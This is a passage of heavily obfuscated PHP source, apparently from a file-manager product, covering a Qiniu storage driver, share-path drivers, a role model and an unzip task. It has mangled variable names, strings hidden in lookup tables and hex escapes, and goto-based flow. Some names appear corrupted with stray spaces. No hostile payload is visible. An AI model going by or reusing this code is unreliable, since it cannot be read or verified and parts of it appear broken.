$ëê”Ğáó : $Ë³Åß¹; } foreach ($šì¸âòó as $Ë³Åß¹) { if ($Ë³Åß¹ == $óÇß¼î•) { continue; } $©œòñÅ¾[] = $Ë³Åß¹; $this->cacheMethodInfoSet($Ë³Åß¹, !0); } if ($»–ùô¸é === $œ„–ûÈÛ[12]) { break; } } $this->cacheMethodInfoSet($úÚˆàóŞ, !0); return array($œ„–ûÈÛ[85] => $©œòñÅ¾, $œ„–ûÈÛ[86] => $½»»“ÈÌ); } public function canRead($¯”±ÎÂ¤) { return $this->exist($¯”±ÎÂ¤) ? !0 : !1; } public function canWrite($‰‰ÃÇÍá) { return $this->exist($‰‰ÃÇÍá) ? !0 : !1; } public function getContent($Œ¨î¸õ“) { return $this->fileSubstr($Œ¨î¸õ“, 0, -1); } public function setContent($ÙòÕëíñ, $®µšóèŠ = '') { $ò—øËÛ = $this->tempFile($this->pathThis($ÙòÕëíñ)); file_put_contents($ò—øËÛ, $®µšóèŠ); if ($this->upload($ÙòÕëíñ, $ò—øËÛ)) { $this->tempFileRemve($ò—øËÛ); return !0; } return !1; } public function refreshUrls($É¯×Ç”) { $Ÿå¶»–“ =& $_SERVER[óÔë„ú]; $ò™ñ‚ÙÊ = array(); if (is_array($É¯×Ç”)) { foreach ($É¯×Ç” as $€…êµâÙ) { $ò™ñ‚ÙÊ[] = $this->link($€…êµâÙ); } } else { $ò™ñ‚ÙÊ[] = $this->link($É¯×Ç”); } $ÖûºıÔ® = new Qiniu\Cdn\CdnManager($this->auth); list($²…¿Ãö, $‚âµâå¾) = $ÖûºıÔ®->refreshUrls($ò™ñ‚ÙÊ); if ($‚âµâå¾) { return !1; } return $²…¿Ãö[$Ÿå¶»–“[1249]] == $Ÿå¶»–“[819] ? !0 : !1; } public function fileSubstr($é‹êÇÈÚ, $óŒÓïÚ­, $÷Ûöİœ) { $”…ÈªÒÌ =& $_SERVER[óÔë„ú]; if (!($¾–È™™– = $this->link($é‹êÇÈÚ))) { return !1; } $âÁâ¿Â¡ = !1; if ($÷Ûöİœ > 0) { $¥‚¼Àâ = $óŒÓïÚ­ + $÷Ûöİœ - 1; $âÁâ¿Â¡ = array($”…ÈªÒÌ[1520] . $óŒÓïÚ­ . $”…ÈªÒÌ[462] . $¥‚¼Àâ); } $’±¹Ü®Î = url_request($¾–È™™–, $”…ÈªÒÌ[261], !1, $âÁâ¿Â¡); return $’±¹Ü®Î[$”…ÈªÒÌ[810]] ? $’±¹Ü®Î[$”…ÈªÒÌ[1274]] : !1; } public function upload($¸³ËÙ¯, $§ƒ›Øñì, $¹ëğÙÀƒ = false, $õ©‰Ú«† = REPEAT_REPLACE) { $›™î»—Á = new Qiniu\Storage\UploadManager(); $É¼à¹”ş = $this->auth->uploadToken($this->bucket, $¸³ËÙ¯); $íïåØÎ² = get_file_mime(get_path_ext($§ƒ›Øñì)); list($øÏ¯ÇÍß, $Ö¢Ìêæ·) = $›™î»—Á->putFile($É¼à¹”ş, $¸³ËÙ¯, $§ƒ›Øñì, null, $íïåØÎ²); return $Ö¢Ìêæ· ? !1 : $this->getPathOuter($¸³ËÙ¯); } public function uploadFormData($’ÑÍ¾ò¯, $œùğ«Æ = 3600) { return $this->uploadToken($’ÑÍ¾ò¯, $œùğ«Æ); } public function multiUploadFormData($”Ò¯âÀ, $şİ­±Ëï = 3600) { return $this->uploadToken($”Ò¯âÀ, $şİ­±Ëï); } private function uploadToken($³§üïî€, $ˆàĞ…‹– = 3600) { $¿»ŞÛ =& $_SERVER[óÔë„ú]; $¥•Š¨· = $ˆàĞ…‹–; $·ïüè…Å = array($¿»ŞÛ[1521] => $¿»ŞÛ[1522]); $ÇÅ±‰”á = $³§üïî€; $ìŸ²á®ö = $this->auth->uploadToken($this->bucket, $ÇÅ±‰”á, $¥•Š¨·, $·ïüè…Å, !0); $œ·œã¾ = empty($this->region) || $this->region == $¿»ŞÛ[1523] ? $¿»ŞÛ[12] : $¿»ŞÛ[462] . $this->region; $Ò‚óàÄÎ = http_type() . "\x3a\57\x2f\x75\160\x6c\x6f\141\144{$œ·œã¾}\56\161\x69\156\x69\165\160\x2e\143\157\155\57"; return array($¿»ŞÛ[1524] => $ìŸ²á®ö, $¿»ŞÛ[1525] => $Ò‚óàÄÎ); } public function download($‘üËô¦è, $ƒé‡Ü´©) { $†¡¨Ÿàì = IO::getPathInner(IO::mkfile($ƒé‡Ü´©)); if (!($ùÉ¤è = $this->link($‘üËô¦è))) { return !1; } $ÆÅ•ÑÃç = 0; $²¦„ë–¾ = 1024 * 200; $¨¸Œèø— = fopen($†¡¨Ÿàì, $_SERVER[óÔë„ú][1526]); while (!0) { $í…áÉŞ = $this->fileSubstr($‘üËô¦è, $ÆÅ•ÑÃç, $²¦„ë–¾); if ($í…áÉŞ === !1) { return !1; } fwrite($¨¸Œèø—, $í…áÉŞ); $ÆÅ•ÑÃç += $²¦„ë–¾; if (strlen($í…áÉŞ) < $²¦„ë–¾) { break; } } fclose($¨¸Œèø—); return $ƒé‡Ü´©; } public function link($«ì»àÜ, $¥µ¢ˆÒ© = '') { if (!$this->isFile($«ì»àÜ)) { return !1; } $ß¼è¥ØÖ = $this->getHost() . $_SERVER[óÔë„ú][8] . $this->pathEncode($«ì»àÜ) . $¥µ¢ˆÒ©; return $this->auth->privateDownloadUrl($ß¼è¥ØÖ, 3600 * 12); } public function fileOut($ÅÎê¬, $Îõ™ïŞû = false, $ÍüöÁÑä = false, $­ı¥ÑŞ‰ = '') { $³ÙÔßÀ =& $_SERVER[óÔë„ú]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÅÎê¬, $Îõ™ïŞû, $ÍüöÁÑä, $­ı¥ÑŞ‰); } if (!$ÍüöÁÑä) { $ÍüöÁÑä = $this->pathThis($ÅÎê¬); } $¬Õ¹ÜŒ‰ = $Îõ™ïŞû ? $³ÙÔßÀ[1527] . rawurlencode($ÍüöÁÑä) : $³ÙÔßÀ[12]; $×§¿˜‚ = $this->link($ÅÎê¬, $¬Õ¹ÜŒ‰); $this->fileOutLink($×§¿˜‚); } public function fileOutServer($¸¼ïÒ©, $ô‡³Ì´™ = false, $Ö¶¶‚Ùß = false, $¥‡äóœ« = '') { parent::fileOut($¸¼ïÒ©, $ô‡³Ì´™, $Ö¶¶‚Ùß, $¥‡äóœ«); } public function fileOutImage($šï¥÷ã†, $Ñâ™¤ = 250) { if ($this->size($šï¥÷ã†) > 1024 * 1024 * 20) { return $this->fileOutImageServer($šï¥÷ã†, $Ñâ™¤); } $Ø—°›— = $this->link($šï¥÷ã†, $_SERVER[óÔë„ú][1528] . $Ñâ™¤); $this->fileOutLink($Ø—°›—); } public function fileOutImageServer($äÜüÆÑÕ, $’ûÖËæ¦ = 250) { parent::fileOutImage($äÜüÆÑÕ, $’ûÖËæ¦); } public function hashMd5($ª¥„Î¹ï) { $«ä§¯¹ =& $_SERVER[óÔë„ú]; $íÅ›â× = $this->objectMeta($ª¥„Î¹ï); return isset($íÅ›â×[$«ä§¯¹[245]]) ? $íÅ›â×[$«ä§¯¹[245]] : !1; $¥³ììÅæ = $this->link($ª¥„Î¹ï, $«ä§¯¹[1529]); } public function size($ñ¾Ü’¢) { $š¼ßËºş = $this->objectMeta($ñ¾Ü’¢); return $š¼ßËºş ? $š¼ßËºş[$_SERVER[óÔë„ú][79]] : 0; } public function info($’µßÁéˆ) { if ($this->isFolder($’µßÁéˆ)) { return $this->folderInfo($’µßÁéˆ); } else { if ($this->isFile($’µßÁéˆ)) { return $this->fileInfo($’µßÁéˆ); } } return !1; } public function exist($·â…Ë˜) { return $this->isFile($·â…Ë˜) || $this->isFolder($·â…Ë˜); } public function isFile($à€ººâ®) { return !$this->isFolder($à€ººâ®) && $this->objectMeta($à€ººâ®); } public function isFolder($Ùòƒ“®ñ) { return $this->cacheMethod($_SERVER[óÔë„ú][179], $Ùòƒ“®ñ); } protected function objectMeta($ÄŞ¸Ã›ï) { return $this->cacheMethod($_SERVER[óÔë„ú][181], $ÄŞ¸Ã›ï); } protected function _objectMeta($î©§ƒû÷) { $£Ùš„½ =& $_SERVER[óÔë„ú]; list($’£­Ì±·, $Üô‚œªÔ) = $this->bucketManager->stat($this->bucket, $î©§ƒû÷); if ($’£­Ì±·) { $’£­Ì±·[$£Ùš„½[79]] = intval($’£­Ì±·[$£Ùš„½[1515]]); } return $’£­Ì±·; } protected function _isFolder($¦ÌêÌ¿») { $’¦ÈØ‹û =& $_SERVER[óÔë„ú]; if ($¦ÌêÌ¿» == $’¦ÈØ‹û[12] || $¦ÌêÌ¿» == $’¦ÈØ‹û[8]) { return !0; } list($²ê©˜Òä, $™–•ïÙû) = $this->bucketManager->listFiles($this->bucket, trim($¦ÌêÌ¿», $’¦ÈØ‹û[8]) . $’¦ÈØ‹û[8], $’¦ÈØ‹û[12], 1, $’¦ÈØ‹û[8]); return !empty($²ê©˜Òä[$’¦ÈØ‹û[1518]]) || !empty($²ê©˜Òä[$’¦ÈØ‹û[1519]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($©ğìØşù, $ßîùŠïº = 0) { parent::__construct(); $this->source = $©ğìØşù; $this->sourceSize = $ßîùŠïº; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($êİæ‹Õä = false) { return $this->sourceSize; } public function getContent($²“”Ù‰è = false) { return $this->fileSubstr($²“”Ù‰è, 0, $this->sourceSize); } public function fileSubstr($ı¼Ñàù» = false, $ØºØ‚™¶ = 0, $õëŸ³˜ï = 0) { if (!$õëŸ³˜ï) { $õëŸ³˜ï = $this->sourceSize; } $Çºé¾›® = $this->sourceSize - $ØºØ‚™¶; if ($õëŸ³˜ï >= $Çºé¾›®) { $õëŸ³˜ï = $Çºé¾›®; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ØºØ‚™¶, $õëŸ³˜ï); } if ($this->sourceType == self::TYPE_FILE) { if ($õëŸ³˜ï <= 0) { return $_SERVER[óÔë„ú][12]; } $áïÎĞ¥Û = ftell($this->source); fseek_64($this->source, $áïÎĞ¥Û + $ØºØ‚™¶); $´„”‰–ó = @fread($this->source, $õëŸ³˜ï); fseek_64($this->source, $áïÎĞ¥Û); return $´„”‰–ó; } } public function hashMd5($ÊÚÔÔ¯Õ = false) { return md5($this->getContent()); } public static function hash($ ÃáèÊÎ, $˜Œ’‡£˜ = 0) { $Àş©ÈĞ„ = new PathDriverStream($ ÃáèÊÎ, $˜Œ’‡£˜); return $Àş©ÈĞ„->hashSimple($ ÃáèÊÎ); } public static function md5($ÌÜ˜áØ…, $ş¬éì = 0) { $á¹‰ş¶í = new PathDriverStream($ÌÜ˜áØ…, $ş¬éì); return $á¹‰ş¶í->hashMd5($ÌÜ˜áØ…); } } goto FäãÆ¹‰Ÿ´; cùİ–¹¸Ü¾: class PathDriverDriverShareItem { public function __construct($…²ÍÑÊ») { $this->pathParse = $…²ÍÑÊ»; } public function __call($šÁúÌ­„, $´¢ÕÊóï) { $¹´õŠÈÆ =& $_SERVER[óÔë„ú]; if (method_exists($this, $šÁúÌ­„)) { return; } $’×à¾ù¥ = call_user_func_array(array($¹´õŠÈÆ[1414], $šÁúÌ­„), $´¢ÕÊóï); $æÔœ¾€è = array($¹´õŠÈÆ[1415], $¹´õŠÈÆ[1416], $¹´õŠÈÆ[1417], $¹´õŠÈÆ[1418], $¹´õŠÈÆ[618], $¹´õŠÈÆ[620], $¹´õŠÈÆ[1419], $¹´õŠÈÆ[110], $¹´õŠÈÆ[1420], $¹´õŠÈÆ[1421]); if (in_array($šÁúÌ­„, $æÔœ¾€è)) { $’×à¾ù¥ = $this->getPathOuter($’×à¾ù¥); } return $’×à¾ù¥; } public function copy($âºÆ£Æ, $ˆ‡ãõ¥, $˜æßªï = false, $ÖüÔß…³ = false) { return $this->copyMove($âºÆ£Æ, $ˆ‡ãõ¥, $˜æßªï, $_SERVER[óÔë„ú][618], $ÖüÔß…³); } public function move($û¡Ñ¸ŸŒ, $¼ê¼ÈªÙ, $•ãÚ«ş„ = false, $Øİ«ˆ³ = false) { return $this->copyMove($û¡Ñ¸ŸŒ, $¼ê¼ÈªÙ, $•ãÚ«ş„, $_SERVER[óÔë„ú][620], $Øİ«ˆ³); } private function copyMove($·Õ¢ù±ï, $ÉãÄ§£, $»ÊÒ”äû, $‚úº®ü, $éá«ª˜ı = false) { $ûğûíÓÊ =& $_SERVER[óÔë„ú]; $‹²á¥ĞÂ = $ÉãÄ§£; $Õïà©…” = IO::driverMake($ÉãÄ§£); if ($Õïà©…”->pathParse[$ûğûíÓÊ[1217]]) { $ÉãÄ§£ = $Õïà©…”->pathParse[$ûğûíÓÊ[1217]]; } else { $ÉãÄ§£ = $‹²á¥ĞÂ; } $­ÔİÜ’™ = IO::copyMove($·Õ¢ù±ï, $ÉãÄ§£, $»ÊÒ”äû, $‚úº®ü, $éá«ª˜ı); $­ÔİÜ’™ = $this->getPathOuter($­ÔİÜ’™); return $­ÔİÜ’™; } public function pathThis($¸Ï²¦Ç) { return get_path_this($this->pathParse[$_SERVER[óÔë„ú][87]]); } public function pathFather($„ÖéàåÕ) { return get_path_father($this->pathParse[$_SERVER[óÔë„ú][87]]); } public function iconvSystem($Ï·³û¥Ä) { return $Ï·³û¥Ä; } protected function infoParse($ñÈúï‘£, $•»êºÕÀ = false) { $¢Òõø£‘ =& $_SERVER[óÔë„ú]; $Ø¢¾Ò×Ø = $this->pathParse[$¢Òõø£‘[560]][$¢Òõø£‘[1242]] . $this->pathParse[$¢Òõø£‘[1235]]; if ($•»êºÕÀ) { $Ùª¦Ä¼ç = IO::infoWithChildren($Ø¢¾Ò×Ø); } else { $Ùª¦Ä¼ç = IO::info($Ø¢¾Ò×Ø); } $»ï–çù› = $this->pathParse[$¢Òõø£‘[560]]; return Action($¢Òõø£‘[1412])->_shareItemeParse($Ùª¦Ä¼ç, $»ï–çù›); } public function listAll($ßş­Ü¨) { $¨ƒ£ã‡ =& $_SERVER[óÔë„ú]; $¶°ÃÂ´ª = IO::listAll($ßş­Ü¨); $ı¡¤Û”¼ = rtrim($this->pathParse[$¨ƒ£ã‡[560]][$¨ƒ£ã‡[1242]], $¨ƒ£ã‡[8]); foreach ($¶°ÃÂ´ª as &$­óÊØÆ) { $­óÊØÆ[$¨ƒ£ã‡[87]] = $this->pathDriver . $¨ƒ£ã‡[8] . ltrim(substr($­óÊØÆ[$¨ƒ£ã‡[87]], strlen($ı¡¤Û”¼)), $¨ƒ£ã‡[8]); } unset($­óÊØÆ); return $¶°ÃÂ´ª; } public function listAllSimple($‰¨ü–Çï, $ëÙ€ÊÄÙ = false) { $Í³ËÙ•ö =& $_SERVER[óÔë„ú]; $Ï½Å¦† = $this->listAll($‰¨ü–Çï); $ÎØ„Ş¨º = $this->pathParse[$Í³ËÙ•ö[495]]; if (trim($ÎØ„Ş¨º, $Í³ËÙ•ö[8]) == trim(get_path_father($ÎØ„Ş¨º), $Í³ËÙ•ö[8])) { $ëÙ€ÊÄÙ = !0; } return IO::init($Í³ËÙ•ö[12])->listAllSimpleMake($Ï½Å¦†, $ÎØ„Ş¨º, $ëÙ€ÊÄÙ); } public function getPathOuter($¼¨í À°) { $¬°ºªõœ =& $_SERVER[óÔë„ú]; $˜¼è§à = KodIO::parse($¼¨í À°); if ($˜¼è§à[$¬°ºªõœ[33]] == KodIO::KOD_SHARE_ITEM) { return $˜¼è§à[$¬°ºªõœ[87]]; } $ˆŞü‡ÏÈ = KodIO::clear($¼¨í À°); $õ…¨–· = KodIO::clear($this->pathParse[$¬°ºªõœ[560]][$¬°ºªõœ[1242]]); $šÖ š˜ = substr($ˆŞü‡ÏÈ, strlen($õ…¨–·)); if (substr($ˆŞü‡ÏÈ, 0, strlen($õ…¨–·)) != $õ…¨–·) { return !1; } return $this->pathParse[$¬°ºªõœ[1236]] . $¬°ºªõœ[8] . ltrim($šÖ š˜, $¬°ºªõœ[8]); } public function getType() { $°ùçÑˆÌ =& $_SERVER[óÔë„ú]; $Ù®Š‚“ = str_replace($°ùçÑˆÌ[77], $°ùçÑˆÌ[12], get_class($this)); return strtolower($Ù®Š‚“); } public function isOsDriver($×ĞÆèÛ) { return IO::isOsDriver($×ĞÆèÛ); } public function info($à‘ŸÏ­‘) { return $this->infoParse($à‘ŸÏ­‘); } public function infoAuth($ïü‚ÙÌ§) { return $this->infoParse($ïü‚ÙÌ§); } public function infoWithChildren($ô•²ÈÔ) { return $this->infoParse($ô•²ÈÔ, !0); } public function infoFull($øÜğÏŸ) { return $this->infoParse($øÜğÏŸ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ Ø¾»İ) { $this->pathParse = $ Ø¾»İ; } protected function infoParse($ì¾ı‰«, $ş­ Ö¶ª = false) { $ÙùãÄÎ¡ =& $_SERVER[óÔë„ú]; return Action($ÙùãÄÎ¡[1241])->sharePathInfo($this->pathParse[$ÙùãÄÎ¡[87]], !0, $ş­ Ö¶ª); } public function listPath($Öí™“¯Ò, $ÙÆÃ¨Úü = false) { $¬Ô€ÎÈ¥ =& $_SERVER[óÔë„ú]; $ÃØË©ñ = IO::listPath($Öí™“¯Ò, $ÙÆÃ¨Úü); if (!$ÃØË©ñ) { return $ÃØË©ñ; } if (is_array($ÃØË©ñ[$¬Ô€ÎÈ¥[1413]])) { $ŠŞİß´¶ = Action($¬Ô€ÎÈ¥[1422])->parsePathChildren($ÃØË©ñ[$¬Ô€ÎÈ¥[1413]], array($¬Ô€ÎÈ¥[495] => $Öí™“¯Ò)); $ÃØË©ñ[$¬Ô€ÎÈ¥[1413]] = Action($¬Ô€ÎÈ¥[1241])->shareItemInfo($ŠŞİß´¶); } foreach ($ÃØË©ñ as $÷À­ÌÓÇ => $ŒÇÅ˜ƒ) { if (!in_array($÷À­ÌÓÇ, array($¬Ô€ÎÈ¥[86], $¬Ô€ÎÈ¥[85]))) { continue; } foreach ($ŒÇÅ˜ƒ as $ïÖã—ãŸ => $ŠŞİß´¶) { $ŠŞİß´¶ = Action($¬Ô€ÎÈ¥[1422])->parsePathChildren($ŠŞİß´¶, array($¬Ô€ÎÈ¥[495] => $Öí™“¯Ò)); $ÃØË©ñ[$÷À­ÌÓÇ][$ïÖã—ãŸ] = Action($¬Ô€ÎÈ¥[1241])->shareItemInfo($ŠŞİß´¶); } } return $ÃØË©ñ; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($üÂï¦ò±) { parent::__construct($üÂï¦ò±); $this->setSignVersion($_SERVER[óÔë„ú][247]); } } goto b‰æ‡‡³Á; AŒ‹†¬‚‹: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\164\145\155\137\x6f\160\x74\151\x6f\x6e"; protected $jsonField = array("\x6d\145\156\165", "\162\157\x6c\145", "\162\x6f\x6c\x65\x47\162\157\165\x70", "\162\x65\x67\x69\163\x74", "\x65\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ü¬Èİú›) { return "\x53\171\x73\x74\145\x6d\x4f\x70\164\x69\x6f\x6e\x5f{$ü¬Èİú›}"; } protected function optionDefault($õœ¬à‡¤ = '') { $±¡ÚÊÉ¸ =& $_SERVER[óÔë„ú]; if ($õœ¬à‡¤ == $±¡ÚÊÉ¸[12]) { return $GLOBALS[$±¡ÚÊÉ¸[6]][$±¡ÚÊÉ¸[457]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\56\162\x6f\x6c\145\x4c\x69\x73\164"; public $field = array("\156\141\155\145", "\141\x75\x74\150", "\x6c\141\x62\x65\154", "\x64\151\163\160\x6c\141\171", "\x73\x79\x73\x74\x65\155", "\144\145\x73\143", "\151\147\x6e\157\162\x65\x45\x78\164", "\x69\147\156\x6f\162\145\x46\x69\x6c\x65\x53\151\x7a\145", "\141\144\x6d\x69\x6e\x69\x73\x74\162\141\164\x6f\x72", "\x73\x6f\x72\x74"); public function listData($º°ƒµ = false, $ßî´ª™ = "\163\x6f\x72\x74", $Úóş®ã¹ = false) { $–ü¿ÚÑÀ =& $_SERVER[óÔë„ú]; $øÈ†«Šô = parent::listData($º°ƒµ, $ßî´ª™, $Úóş®ã¹); if (!$º°ƒµ) { foreach ($øÈ†«Šô as $ìÑóúÆï => $Èá„á›) { if ($Èá„á›[$–ü¿ÚÑÀ[2164]] == 1) { $øÈ†«Šô[$ìÑóúÆï][$–ü¿ÚÑÀ[526]] = LNG($–ü¿ÚÑÀ[2425]); } } } return $øÈ†«Šô; } public function update($ÜÌĞÀ§î, $Ç«Ô¦èÍ) { $ÕÒ®ğäß =& $_SERVER[óÔë„ú]; $Æşñ’¢ = parent::listData($ÜÌĞÀ§î); $á•‡®¾Û = $this->findByName($Ç«Ô¦èÍ[$ÕÒ®ğäß[32]]); if (!$Æşñ’¢ || $á•‡®¾Û && $á•‡®¾Û[$ÕÒ®ğäß[475]] != $Æşñ’¢[$ÕÒ®ğäß[475]]) { return !1; } if ($á•‡®¾Û[$ÕÒ®ğäß[2164]] == 1) { $Ç«Ô¦èÍ = array($ÕÒ®ğäß[32] => $Ç«Ô¦èÍ[$ÕÒ®ğäß[32]], $ÕÒ®ğäß[1980] => $Ç«Ô¦èÍ[$ÕÒ®ğäß[1980]]); } $this->filterAuth($Ç«Ô¦èÍ[$ÕÒ®ğäß[487]]); return parent::update($ÜÌĞÀ§î, $Ç«Ô¦èÍ); } public function remove($äòº¸ø) { $·ó¯ÃğÍ = parent::listData($äòº¸ø); if (!$·ó¯ÃğÍ || $·ó¯ÃğÍ[$_SERVER[óÔë„ú][191]]) { return !1; } return parent::remove($äòº¸ø); } public function add($ï…­Óò) { $å’×•‘ =& $_SERVER[óÔë„ú]; $–Ö¹øÇ´ = $ï…­Óò[$å’×•‘[32]]; if ($this->findByName($–Ö¹øÇ´)) { return !1; } $ñï·á° = array($å’×•‘[494] => $–Ö¹øÇ´, $å’×•‘[1963] => $å’×•‘[12], $å’×•‘[1959] => $å’×•‘[1967], $å’×•‘[2426] => 1, $å’×•‘[1962] => 0, $å’×•‘[2427] => 0, $å’×•‘[1961] => $this->getSort()); $ï…­Óò = array_merge($ñï·á°, $ï…­Óò); $this->filterAuth($ï…­Óò[$å’×•‘[487]]); return parent::insert($ï…­Óò); } private function getSort() { $ıàşÚÂù =& $_SERVER[óÔë„ú]; $®‚ÇÊ€ô = parent::listData(); $•ÕÕâ®é = array_to_keyvalue($®‚ÇÊ€ô, $ıàşÚÂù[12], $ıàşÚÂù[1981]); return empty($•ÕÕâ®é) ? 0 : max($•ÕÕâ®é) + 1; } private function filterAuth(&$û£–Ù½ê) { $©¹ü˜·¿ =& $_SERVER[óÔë„ú]; $¬·Ô¨ŸÛ = array(); $‚ù»Ã¾ = array_filter(explode($©¹ü˜·¿[50], $û£–Ù½ê)); foreach ($‚ù»Ã¾ as $û£–Ù½ê) { $Ò÷¿£Ãê = explode($©¹ü˜·¿[10], $û£–Ù½ê); if ($Ò÷¿£Ãê[0] == $©¹ü˜·¿[2428] && $Ò÷¿£Ãê[1] != $©¹ü˜·¿[1262]) { $ÀëİôÖ = $Ò÷¿£Ãê[0] . $©¹ü˜·¿[10] . $Ò÷¿£Ãê[1] . $©¹ü˜·¿[2429]; if (!in_array($ÀëİôÖ, $‚ù»Ã¾)) { $¬·Ô¨ŸÛ[] = $ÀëİôÖ; } } $¬·Ô¨ŸÛ[] = $û£–Ù½ê; } $û£–Ù½ê = implode($©¹ü˜·¿[50], $¬·Ô¨ŸÛ); } public function findRoleDefault() { $Ğ”ï¢’¤ =& $_SERVER[óÔë„ú]; $¤ªé¡û× = parent::listData(); $—¥şøŞî = !1; foreach ($¤ªé¡û× as $¨«üâé) { if (!$¨«üâé || $¨«üâé[$Ğ”ï¢’¤[1979]] == $Ğ”ï¢’¤[228] || $¨«üâé[$Ğ”ï¢’¤[2164]] == 1) { continue; } if (strstr($¨«üâé[$Ğ”ï¢’¤[487]], $Ğ”ï¢’¤[2430])) { continue; } if (!strstr($¨«üâé[$Ğ”ï¢’¤[487]], $Ğ”ï¢’¤[2431])) { continue; } if (!$—¥şøŞî) { $—¥şøŞî = $¨«üâé; continue; } $ä¯šòèÀ = explode($Ğ”ï¢’¤[50], $—¥şøŞî[$Ğ”ï¢’¤[487]]); $Ë–æüéÖ = explode($Ğ”ï¢’¤[50], $¨«üâé[$Ğ”ï¢’¤[487]]); if (count($ä¯šòèÀ) > count($Ë–æüéÖ)) { $—¥şøŞî = $¨«üâé; } } return $—¥şøŞî ? $—¥şøŞî[$Ğ”ï¢’¤[475]] : $Ğ”ï¢’¤[12]; } public function sort($ÑÎ·ç„, $ÚÖ£ûú¢) { return parent::update($ÑÎ·ç„, $ÚÖ£ûú¢); } } goto B‚¼Ëùøç; cÃ¹Í¼“¦Ğ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $æçûß–™ =& $_SERVER[óÔë„ú]; parent::startAfter(); Hook::bind($æçûß–™[1871], array($this, $æçûß–™[1872])); Hook::bind($æçûß–™[1265], array($this, $æçûß–™[1873])); Hook::bind($æçûß–™[1874], array($this, $æçûß–™[1875])); $Í®²ÂşÃ =& $this->task; $Í®²ÂşÃ[$æçûß–™[1876]] = $æçûß–™[1266]; if (!$Í®²ÂşÃ[$æçûß–™[1647]]) { $Í®²ÂşÃ[$æçûß–™[1647]] = LNG($æçûß–™[1877]); } } protected function endAfter() { $»ßÌå¥Ã =& $_SERVER[óÔë„ú]; parent::endAfter(); Hook::unbind($»ßÌå¥Ã[1871], array($this, $»ßÌå¥Ã[1872])); Hook::unbind($»ßÌå¥Ã[1265], array($this, $»ßÌå¥Ã[1873])); Hook::unbind($»ßÌå¥Ã[1874], array($this, $»ßÌå¥Ã[1875])); } public function updateAfter() { $•‚†Ä‰ =& $_SERVER[óÔë„ú]; $Üê÷ºÀ× =& $this->task; if (!$Üê÷ºÀ×[$•‚†Ä‰[1126]] || !$Üê÷ºÀ×[$•‚†Ä‰[823]]) { if ($Üê÷ºÀ×[$•‚†Ä‰[1876]] != $•‚†Ä‰[389]) { return; } } if ($Üê÷ºÀ×[$•‚†Ä‰[1876]] == $•‚†Ä‰[1266]) { $°Œ‚»Û = 0; if ($Üê÷ºÀ×[$•‚†Ä‰[1811]]) { $°Œ‚»Û = $Üê÷ºÀ×[$•‚†Ä‰[1812]] / $Üê÷ºÀ×[$•‚†Ä‰[1811]]; } $Üê÷ºÀ×[$•‚†Ä‰[1760]] = $°Œ‚»Û * 0.3; } else { if ($Üê÷ºÀ×[$•‚†Ä‰[1876]] == $•‚†Ä‰[389]) { $°Œ‚»Û = $Üê÷ºÀ×[$•‚†Ä‰[1759]] / $Üê÷ºÀ×[$•‚†Ä‰[1126]]; $Üê÷ºÀ×[$•‚†Ä‰[1760]] = 0.3 + $°Œ‚»Û * 0.4; } else { if ($Üê÷ºÀ×[$•‚†Ä‰[1876]] == $•‚†Ä‰[110]) { $¶÷¯”ÊÓ = 0; if ($Üê÷ºÀ×[$•‚†Ä‰[1813]] == $•‚†Ä‰[110]) { $¶÷¯”ÊÓ = $Üê÷ºÀ×[$•‚†Ä‰[1812]]; } $°Œ‚»Û = ($Üê÷ºÀ×[$•‚†Ä‰[1816]] + $¶÷¯”ÊÓ) / $Üê÷ºÀ×[$•‚†Ä‰[823]]; $Üê÷ºÀ×[$•‚†Ä‰[1760]] = 0.3 + 0.4 + $°Œ‚»Û * 0.3; } } } if ($Üê÷ºÀ×[$•‚†Ä‰[1760]] > 0) { $‹àó®°è = timeFloat() - $Üê÷ºÀ×[$•‚†Ä‰[1762]] - $Üê÷ºÀ×[$•‚†Ä‰[1765]]; $Üê÷ºÀ×[$•‚†Ä‰[1766]] = $‹àó®°è * (1 - $Üê÷ºÀ×[$•‚†Ä‰[1760]]) / $Üê÷ºÀ×[$•‚†Ä‰[1760]]; } } public function addFile($ˆÛ´ŒÔÌ) { $ßš…´ç¯ =& $_SERVER[óÔë„ú]; $Ê±¾†üŒ =& $this->task; $ßëÔã¤” = IO::info($ˆÛ´ŒÔÌ); $Ê±¾†üŒ[$ßš…´ç¯[1809]] = $ßëÔã¤”[$ßš…´ç¯[32]]; $Ê±¾†üŒ[$ßš…´ç¯[1811]] = $ßëÔã¤”[$ßš…´ç¯[79]]; $Ê±¾†üŒ[$ßš…´ç¯[1812]] = 0; $Ê±¾†üŒ[$ßš…´ç¯[1128]] = $ßš…´ç¯[1832]; $Ê±¾†üŒ[$ßš…´ç¯[1813]] = $ßš…´ç¯[1266]; $Ê±¾†üŒ[$ßš…´ç¯[823]] = $ßëÔã¤”[$ßš…´ç¯[79]]; $Ê±¾†üŒ[$ßš…´ç¯[1126]] = 1; $¸‡©äÌ³ = 0; $Ê±¾†üŒ[$ßš…´ç¯[1820]] = array($ßš…´ç¯[1821] => $¸‡©äÌ³ + 1, $ßš…´ç¯[494] => $ßëÔã¤”[$ßš…´ç¯[32]], $ßš…´ç¯[87] => $ßëÔã¤”[$ßš…´ç¯[87]], $ßš…´ç¯[582] => $ßëÔã¤”[$ßš…´ç¯[582]] ? $ßëÔã¤”[$ßš…´ç¯[582]] : $ßëÔã¤”[$ßš…´ç¯[87]]); $this->update(); } public function zipEvent($âÉ¶Íâ›, $³èâÂ¾Û, $›®ÈÂìˆ, $èšæšê) { $º·‚¤–· =& $_SERVER[óÔë„ú]; $ü­æ–¤‚ =& $this->task; $ü­æ–¤‚[$º·‚¤–·[1809]] = get_path_this($³èâÂ¾Û); $ü­æ–¤‚[$º·‚¤–·[1811]] = $èšæšê; $ü­æ–¤‚[$º·‚¤–·[1812]] = $›®ÈÂìˆ; 